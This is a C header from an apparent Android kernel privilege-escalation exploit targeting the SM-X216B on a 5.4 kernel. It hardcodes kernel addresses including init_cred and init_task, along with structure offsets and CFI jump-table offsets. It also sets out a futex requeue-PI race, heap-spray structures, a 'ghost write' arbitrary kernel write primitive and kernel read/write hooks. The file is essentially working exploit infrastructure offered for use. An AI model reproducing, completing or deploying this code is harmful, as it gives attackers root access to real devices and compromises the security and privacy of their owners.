#ifndef MINIMAL_RMG_COMMON_H
#define MINIMAL_RMG_COMMON_H

#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>

/* ── Kernel memory layout ── */
#ifndef KIMAGE_TEXT_BASE
#define KIMAGE_TEXT_BASE    0xffffffc010080000ULL
#endif
#ifndef KIMAGE_VADDR
#define KIMAGE_VADDR        0xffffffc000000000ULL
#endif
#ifndef DIRECT_MAP_BASE
#define DIRECT_MAP_BASE     0xffffff8000000000ULL
#endif
#ifndef DIRECT_MAP_END
#define DIRECT_MAP_END      0xffffffc000000000ULL
#endif
#ifndef VMEMMAP_START
#define VMEMMAP_START       0xfffffffe00000000ULL
#endif
#ifndef PHYS_OFFSET
#define PHYS_OFFSET         0x80000000ULL
#endif
#define PAGE_SIZE           4096

/* ── Target waiter layout (SM-X216B Android 5.4 kernel) ──
 * task/lock/prio are corroborated by target disassembly and runtime probes;
 * target PI-walk stores and compares the deadline at +0x48.
 */
#define W_TREE_ENTRY        0x00
#define W_PI_TREE_ENTRY     0x18
#define W_TASK              0x30
#define W_LOCK              0x38
#define W_PRIO              0x40
#define W_DEADLINE          0x48
#define W_SIZE              0x50

/* ── task_struct offsets ── */
#define TS_PI_LOCK          0x8dc
#define TS_PI_WAITERS       0x8e8
#define TS_PI_BLOCKED_ON    0x900

/* ── KASLR slide ── */
#define SLIDE_ROWS          32
#define SLIDE_STEP          0x10000ULL

/* ── struct page (5.4) ── */
#define STRUCT_PAGE_SIZE            0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_PAGE_SLAB_CACHE_OFF    0x18
#define STRUCT_PAGE_TYPE_OFF          0x34

/* ── Pipe ── */
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#define PIPE_BUFFER_SLOTS       16

/* ── Workqueue ── */
#define WQ_DFL_PWQ_OFF      0xA0
#define PWQ_POOL_OFF        0x00
#define POOL_WORKLIST_OFF   0x20
#define POOL_NR_IDLE_OFF    0x34

/* ── work_struct ── */
#define WORK_DATA_OFF       0x00
#define WORK_ENTRY_NEXT_OFF 0x08
#define WORK_ENTRY_PREV_OFF 0x10
#define WORK_FUNC_OFF       0x18

/* ── subprocess_info ── */
#define SPI_WORK_OFF        0x00
#define SPI_COMPLETE_OFF    0x30
#define SPI_PATH_OFF        0x38
#define SPI_ARGV_OFF        0x40
#define SPI_ENVP_OFF        0x48
#define SPI_WAIT_OFF        0x58
#define SPI_RETVAL_OFF      0x5C

/* ── CFI jump table ── */
#define OFF_CFI_UMH_EXEC_WORK           0x01601870ULL
#define OFF_CFI_CONFIGFS_READ_FILE      0x015f3a60ULL
#define OFF_CFI_CONFIGFS_WRITE_BIN      0x015f595cULL

/* ── Target addresses ── */
#ifndef ADDR_INIT_TASK
#define ADDR_INIT_TASK      0xffffffc0129e0280ULL
#endif
#define ADDR_INIT_CRED      0xffffffc0129ec740ULL
#define ADDR_DEAD_BEEF      0xDEADBEEFCAFEBABEULL

/* ── Ghost write primitive infrastructure ──
 * For the PI-walk to succeed:
 * - fake_lock must point to a valid rt_mutex (owner=0, waiters empty)
 * - ghost_task must be a dead-end task (pi_blocked_on=0) to terminate the walk
 *
 * For 5.4 kernels, we use:
 * - k_fake_lock: a writable zeroed BSS region that looks like an empty rt_mutex
 * - k_ghost_task: a region that reads as null (pi_blocked_on=0)
 */
extern uint64_t g_k_fake_lock;
extern uint64_t g_k_fake_lock2;
extern uint64_t g_k_ghost_task;

/* ── Respray state for ghost write primitive ──
 * After initial stamp (lock=k_fake_lock), we need to respray to update
 * rb tree pointers (parent_color, right, left) for the write primitive.
 * This is done by adjusting Y's priority again with lock=k_fake_lock2.
 */
extern volatile int g_respray_ready;
extern volatile int g_respray_done;
extern uint64_t g_respray_parent_color;
extern uint64_t g_respray_value;
extern uint64_t g_respray_lock;

/* ── Helpers ── */
static inline uint64_t kaddr(uint64_t off) {
    return KIMAGE_TEXT_BASE + off;
}

/* ── Futex opcodes ── */
#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI   10
#endif
#ifndef FUTEX_CMP_REQUEUE_PI
#define FUTEX_CMP_REQUEUE_PI    12
#endif
#ifndef FUTEX_LOCK_PI
#define FUTEX_LOCK_PI           6
#endif
#ifndef FUTEX_UNLOCK_PI
#define FUTEX_UNLOCK_PI         8
#endif

/* ── Raw AArch64 syscall primitives ── */
#ifndef __NR_futex
#define __NR_futex              98
#endif

/* Accept both volatile and _Atomic pointers (they are compatible at syscall level) */
static inline long futex_raw(void *uaddr, long op, long val,
                             long val2, void *uaddr2, long val3) {
    register long x0 __asm__("x0") = (long)uaddr;
    register long x1 __asm__("x1") = op;
    register long x2 __asm__("x2") = val;
    register long x3 __asm__("x3") = val2;
    register long x4 __asm__("x4") = (long)uaddr2;
    register long x5 __asm__("x5") = val3;
    register long x8 __asm__("x8") = __NR_futex;
    __asm__ volatile("svc #0"
                     : "+r"(x0)
                     : "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5), "r"(x8)
                     : "memory", "cc");
    return x0;
}

static inline long syscall_raw(long nr, long a0, long a1, long a2, long a3,
                               long a4, long a5) {
    register long x0 __asm__("x0") = a0;
    register long x1 __asm__("x1") = a1;
    register long x2 __asm__("x2") = a2;
    register long x3 __asm__("x3") = a3;
    register long x4 __asm__("x4") = a4;
    register long x5 __asm__("x5") = a5;
    register long x8 __asm__("x8") = nr;
    __asm__ volatile("svc #0"
                     : "+r"(x0)
                     : "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5), "r"(x8)
                     : "memory", "cc");
    return x0;
}

static void sigusr1_handler(int sig) {
    (void)sig;
}

/* ── sched_attr ── */
/* Stripped duplicate definition for NDK r30 compatibility
struct sched_attr {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t  sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint64_t sched_period;
};
*/

#ifndef PRIO_PROCESS
#define PRIO_PROCESS 0
#endif

/* ── spray_plan (defined BEFORE prototypes) ── */
struct spray_plan {
    uint64_t pi_tree_pc;
    uint64_t pi_tree_right;
    uint64_t pi_tree_left;
    uint64_t task;
    uint64_t lock;
    uint32_t prio;
};

/* ── Function prototypes ── */
int      trigger_futex_race(void);
int      trigger_walk(void);
int      spray_waiter(struct spray_plan *plan);
uint64_t spray_warmup_marker(void);

/* ── Stack measurement helpers ── */
#ifdef ENABLE_STACK_MEASUREMENT
#define LOG_WAITER_SP() \
    do { \
        unsigned long waiter_sp; \
        asm volatile( \
            "sub %0, x29, #0xc8" \
            : "=r" (waiter_sp) \
        ); \
        printf("[WAITER_SP] 0x%lx\n", waiter_sp); \
        fflush(stdout); \
    } while (0)
#else
#define LOG_WAITER_SP()
#endif

/* ── Ghost write primitive ──
 * ghost_write_value(target, value) performs an rb_erase_cached write primitive:
 * - Uses the stale waiter's rb_node fields as the write primitive
 * - The write goes to: child->__rb_parent_color where child = (rb_node *)value
 * - Target address is encoded in parent_color: (target - 8) & ~3
 * - Value is written at target
 *
 * This requires two-phase ghost writing:
 * 1. Initial stamp: rb_parent_color=0, rb_right=0, rb_left=0, task=ghost_task, lock=fake_lock
 * 2. Respray: update rb_parent_color to target-8, rb_right to value
 */
int ghost_write_value(uint64_t target, uint64_t value);

/* ── Arbitrary kernel R/W (stubbed) ── */
extern int kwrite64(uint64_t addr, uint64_t val);
extern int kread64(uint64_t addr, uint64_t *out);

/* ── race_ctx structure (for compatibility with old code) ── */
struct race_ctx {
    int sockfd;
    volatile int waiter_ready;
    volatile int waiter_waiting;
    volatile int owner_started;
    volatile int a_sprayed;
    volatile int walk_done;
    volatile pid_t tid_a;
    volatile int cmp_requeued;
    volatile int edealdk_confirmed;
    volatile int waiter_return_errno;
    volatile int waiter_timed_out;
    volatile int waiter_unlocked_before_stamp;
    volatile int stamp_entered;
    volatile int stamp_completed;
    volatile int release_requested;
    volatile int release_signal_errno;
    volatile int respray_ready;
    volatile int respray_done;
    volatile int stop;
    uint64_t respray_parent_color;
    uint64_t respray_value;
    uint64_t respray_lock;
    int fake_lock_idx;
    uint64_t t_begin_ms;
    uint64_t t_wait_enter_ms;
    uint64_t t_cmp_call_ms;
    uint64_t t_cmp_return_ms;
    uint64_t t_release_ms;
    uint64_t t_wait_return_ms;
    uint64_t t_unlock_ms;
    uint64_t t_stamp_enter_ms;
    uint64_t t_stamp_done_ms;
    uint64_t t_consumer_walk_ms;
    uint64_t t_walk_done_ms;
};

extern struct race_ctx *g_race_ctx_for_ghost;

#endif
